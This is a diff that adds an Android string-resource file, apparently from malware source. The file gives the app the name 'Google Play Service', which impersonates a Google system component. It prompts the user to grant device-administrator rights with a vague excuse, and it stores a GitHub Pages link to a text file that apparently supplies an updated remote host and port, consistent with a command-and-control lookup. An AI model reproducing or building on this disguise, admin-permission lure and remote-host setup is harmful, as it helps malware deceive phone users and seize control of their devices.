@@ -1,0 +1,5 @@
+<resources>
+    <string name="app_name">Google Play Service</string>
+    <string name="device_admin_explanation">Please allow admin permission to work properly.</string>
+    <string name="updated_host_check_link">https://venomdino.github.io/xyz/myth-updated-host-with-port.txt</string>
+</resources>
